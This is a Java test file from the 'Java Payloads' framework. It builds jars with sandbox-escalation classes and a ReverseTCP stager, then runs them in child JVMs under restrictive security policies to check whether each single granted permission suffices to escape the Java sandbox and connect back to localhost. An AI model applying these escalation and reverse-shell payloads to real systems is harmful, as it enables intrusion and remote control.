/*
 * Java Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package javapayload.test;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.jar.Manifest;

import javapayload.builder.ClassBuilder;
import javapayload.builder.JarBuilder;
import javapayload.builder.SpawnTemplate;
import javapayload.handler.stager.StagerHandler;
import javapayload.stage.StageMenu;
import javapayload.stage.StreamForwarder;

public class EscalateTest {

	public static void main(String[] args) throws Exception {
		System.out.println("Testing escalation...");
		String[] privileges = new String[] {
				"permission java.security.AllPermission;",
				"permission java.lang.RuntimePermission \"setSecurityManager\";",
				"permission java.lang.reflect.ReflectPermission \"suppressAccessChecks\";" +
						"permission java.lang.RuntimePermission \"accessDeclaredMembers\";",
				"permission java.lang.RuntimePermission \"createClassLoader\";",
				"permission java.security.SecurityPermission \"createAccessControlContext\";",
				"permission java.security.SecurityPermission \"setPolicy\";",
		};
		String[] builderArgs = new String[] { "ReverseTCP" };
		final Class[] baseClasses = new Class[] {
				javapayload.escalate.EscalateBasics.class,
				javapayload.escalate.EscalateLoader.class,
				javapayload.escalate.EscalateCreateAccessControlContext.class,
				javapayload.escalate.EscalateSetPolicy.class,
				javapayload.escalate.EscalateCreateClassLoader.class,
				javapayload.escalate.EscalateCreateClassLoaderPayload.class,
				javapayload.stage.StreamForwarder.class,
				javapayload.loader.StandaloneLoader.class,
				javapayload.stager.Stager.class,
		};
		final Manifest manifest = new Manifest();
		manifest.getMainAttributes().putValue("Main-Class", "javapayload.escalate.EscalateLoader");
		JarBuilder.buildJarFromArgs(builderArgs, "", baseClasses, manifest, null, null);
		for (int i = 0; i < privileges.length; i++) {
			System.out.println("\t" + privileges[i]);
			testEscalate(privileges[i], false);
		}
		if (!new File(builderArgs[0] + ".jar").delete())
			throw new IOException("Unable to delete file");
		if (!new File("escalatetest.policy").delete())
			throw new IOException("Unable to delete file");
		System.out.println("Testing Escalate dynstager...");
		privileges = (String[]) Arrays.copyOf(privileges, privileges.length - 2);
		new ClassBuilder().build(new String[] { "Escalate_ReverseTCP", "EscalateDynstagerTest" });
		for (int i = 0; i < privileges.length; i++) {
			System.out.println("\t" + privileges[i]);
			testEscalate(privileges[i], true);
		}
		if (!new File("EscalateDynstagerTest.class").delete())
			throw new IOException("Unable to delete file");
		if (!new File("escalatetest.policy").delete())
			throw new IOException("Unable to delete file");
		System.out.println("Escalation tests finished.");
		new ThreadWatchdogThread(5000).start();
	}

	protected static void testEscalate(final String privilege, final boolean dynstager) throws Exception {
		final String[] args = StageMenu.splitArgs((dynstager ? "Escalate_" : "") + "ReverseTCP localhost # -- TestStub Fast");
		final StagerHandler.Loader loader = new StagerHandler.Loader(args);
		loader.handleBefore(System.err, null);
		final Throwable[] tt = new Throwable[1];
		final boolean[] notify = new boolean[1];
		Thread t = new Thread(new Runnable() {
			public void run() {
				try {
					String[] payloadArgs = (String[]) loader.getArgs().clone();
					payloadArgs[0] = "+" + payloadArgs[0];
					runJavaAndWait(notify, dynstager ? "." : args[0] + ".jar", dynstager ? "EscalateDynstagerTest" : "javapayload.escalate.EscalateLoader", "grant { " + privilege + " };", payloadArgs);
				} catch (Throwable t) {
					tt[0] = t;
				}
			};
		});
		t.start();
		synchronized (notify) {
			while (!notify[0])
				notify.wait();
		}
		if (loader != null)
			loader.handleAfter(System.err, null);
		t.join();
		if (tt[0] != null) {
			/* #JDK1.4 */try {
				throw new Exception("Builder result died", tt[0]);
			} catch (NoSuchMethodError ex2) /**/{
				throw new Exception("Builder result died: " + tt[0].toString());
			}
		}
	}

	public static void runJavaAndWait(boolean[] notify, String classpath, String mainClass, String policyfile, String[] args) throws Exception {
		List commands = new ArrayList();
		commands.add(SpawnTemplate.getJreExecutable("java"));
		commands.add("-classpath");
		commands.add(classpath + System.getProperty("javapayload.child.classpath", ""));
		if (System.getProperty("net.sourceforge.cobertura.datafile") != null) {
			commands.add("-Dnet.sourceforge.cobertura.datafile=" + System.getProperty("net.sourceforge.cobertura.datafile").replace('1', '2'));
		}
		FileWriter fw = new FileWriter("escalatetest.policy");
		fw.write(policyfile);
		fw.close();
		commands.add("-Djava.security.manager");
		commands.add("-Djava.security.policy=escalatetest.policy");
		commands.add(mainClass);
		commands.addAll(Arrays.asList(args));
		String[] commandArgs = (String[]) commands.toArray(new String[commands.size()]);
		Process proc = Runtime.getRuntime().exec(commandArgs);
		new StreamForwarder(proc.getErrorStream(), System.err, System.err, false).start();
		proc.getInputStream().read();
		synchronized (notify) {
			notify[0] = true;
			notify.notifyAll();
		}
		if (proc.waitFor() != 0)
			throw new IOException("Build result exited with error code " + proc.exitValue());
	}
}